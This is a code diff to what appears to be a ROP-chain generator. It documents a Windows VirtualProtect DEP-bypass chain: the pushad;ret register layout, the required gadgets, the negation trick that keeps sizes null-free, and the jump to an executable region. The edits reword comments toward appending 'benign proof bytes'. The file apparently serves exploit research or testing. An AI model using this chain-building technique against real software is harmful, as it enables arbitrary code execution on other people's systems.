@@ -15,18 +15,18 @@ VirtualProtectChain
 
     After ``pushad; ret`` the ret pops EDI into EIP.  The chain sets:
         EDI = ptr_to_ret  - executes one more ret, landing on ESI
-        ESI = VirtualProtect - called as the next instruction after the second ret
+        ESI = callable VirtualProtect target - called after the second ret
         EBP = jmp_esp gadget - return address used by VirtualProtect (stdcall)
-        pre-PUSHAD ESP = lpAddress - the address of the pushad gadget's next
-                         element (the ShellcodePtr), which equals shellcode base
+        pre-PUSHAD ESP = lpAddress - the address immediately after the
+                         pushad-ret gadget, where proof bytes are appended
         EBX = dwSize (shellcode size, encoded null-free via negation)
         EDX = flNewProtect (0x40 = PAGE_EXECUTE_READWRITE)
         ECX = lpflOldProtect (writable static dword)
         EAX = 0x90909090 (NOP filler; becomes NOP sled at VirtualProtect return)
 
     After VirtualProtect returns to EBP (jmp esp), ESP points into the
-    executable shellcode region.  Prepend the shellcode with a short NOP sled
-    to absorb the few-byte offset introduced by the PUSHAD frame cleanup.
+    executable proof-byte region. Append a short NOP sled and benign proof bytes
+    directly after the serialized chain.
 
     Required gadget DB keys
     -----------------------
@@ -61,7 +61,7 @@ VIRTUALPROTECT_REQUIRED_GADGETS: frozenset[str] = frozenset({
     "pop_edi_ret",         # pop edi; ret
     "ptr_to_ret",          # any address containing a ret (skeleton trampoline)
     "pop_esi_ret",         # pop esi; ret
-    "virtualprotect_ptr",  # address of VirtualProtect (IAT entry or resolved)
+    "virtualprotect_ptr",  # callable wrapper, import thunk, or resolved address
     "pop_ebp_ret",         # pop ebp; ret
     "jmp_esp",             # jmp esp
     "pop_eax_ret",         # pop eax; ret  (used twice: neg trick + NOP filler)
@@ -208,11 +208,11 @@ class VirtualProtectChain:
             GadgetRef("ptr_to_ret",
                        "EDI <- address of any ret instruction (PUSHAD trampoline)"),
 
-            # ESI: VirtualProtect function address (called via the two-ret hop)
+            # ESI: callable VirtualProtect target (called via the two-ret hop)
             GadgetRef("pop_esi_ret",
                        "load VirtualProtect address into ESI"),
             GadgetRef("virtualprotect_ptr",
-                       "ESI <- VirtualProtect (IAT entry or resolved function)"),
+                       "ESI <- callable VirtualProtect target"),
 
             # EBP: return target after VirtualProtect returns (jmp esp -> shellcode)
             GadgetRef("pop_ebp_ret",
@@ -258,11 +258,6 @@ class VirtualProtectChain:
             # which then rets to ESI (VirtualProtect).
             GadgetRef("pushad_ret",
                        "pushad + ret -> EDI (ptr_to_ret) -> ret -> ESI (VirtualProtect)"),
-
-            # -- Shellcode follows immediately ---------------------------------
-            # The pre-PUSHAD value of ESP equals this element's address,
-            # which VirtualProtect receives as lpAddress.
-            ShellcodePtr("shellcode base - pre-PUSHAD ESP == lpAddress arg to VirtualProtect"),
         ]
         return chain
 
